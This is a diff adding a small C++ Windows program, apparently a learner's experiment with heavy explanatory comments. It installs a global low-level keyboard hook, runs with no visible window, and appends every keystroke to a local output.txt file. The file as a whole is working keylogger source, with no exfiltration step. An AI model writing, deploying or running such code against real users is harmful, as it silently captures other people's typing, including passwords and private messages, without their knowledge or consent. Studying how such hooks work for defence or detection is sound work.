@@ -1,0 +1,66 @@
+#include <iostream>
+
+// testing.cpp : Defines the entry point for the console application.
+//
+
+// #include "stdafx.h"  // needed for VS, entry point
+#include <iostream> // stream needed for outputting to screen (cout/cin)
+#include <string> // allows for std::string
+#include <ctime> // for time management, clock_t
+#include <windows.h> // allows for windows hook into API/keyboard
+#include <fstream>
+
+
+
+HHOOK _hook_keyboard; // creates a value/process type which can be accessed later on
+KBDLLHOOKSTRUCT kbdStruct; // contains information about a low-level keyboard input event, creates something we can attach to
+
+// Lresult is a datatype that is a number of bytes large
+// lparam is a long pointer (signed long) for windows  // signed can be positive or negative
+// wparam is a uint pointer (unsigned int) for windows  // unsigned can only be positive
+// stdcall is a windows calling convention, pushes parameters on the stack in reverse order(right to left)
+LRESULT __stdcall HookCallbackKeyboard(int nCode, WPARAM wParam, LPARAM lParam)
+{
+	if (nCode >= 0) // ncode = 0 is global hook, which is all we want here so we dont want larger than 0
+	{
+		// variable* is a typedef tag/struct definition
+		kbdStruct = *((KBDLLHOOKSTRUCT*)lParam); // set variable equal to pointer of our hook structure, (gives value of 1-254?)
+		if (wParam == WM_KEYDOWN)  // WM_Keydown is always set to 0, so if param = 0? (29 bits for both up and down)
+		{
+			std::ofstream myfile;
+			myfile.open("E:\\Programming\\c++\\test1\\test1\\output.txt", std::ofstream::out | std::ofstream::app);
+			char c = MapVirtualKey(kbdStruct.vkCode, 2);  // returns a character value, (vkCode defines that it is a virtual key?)
+			//std::cout << c << std::endl;
+			myfile << c;
+			myfile.close();
+			
+		}
+	}
+	return CallNextHookEx(_hook_keyboard, nCode, wParam, lParam);
+	// Passes hook info to next hook procedure in hook chain, is called either before or after processing hook info
+}
+
+void SetHook()
+{
+	if (!(_hook_keyboard = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallbackKeyboard, NULL, 0)))
+	// if set windows hook to keyboard with a callback on keyboard fails
+	{ // this is a test one two three
+		// DWORD error = GetLastError();
+		MessageBox(NULL, "Failed to install hook on keyboard", "Error", MB_ICONERROR); // show message box
+	}
+}
+
+
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
+{
+	// MessageBox(NULL, "This is a test, dafuq is going on", "ERROR", MB_ICONERROR);
+	SetHook();
+
+	MSG msg; // creates variable message and is used for win32 api
+	while (GetMessage(&msg, NULL, 0, 0))  // using winapi getmessage and getting reference of msg
+	{ 
+		TranslateMessage(&msg);
+		DispatchMessage(&msg);
+	}
+	return msg.wParam;
+}
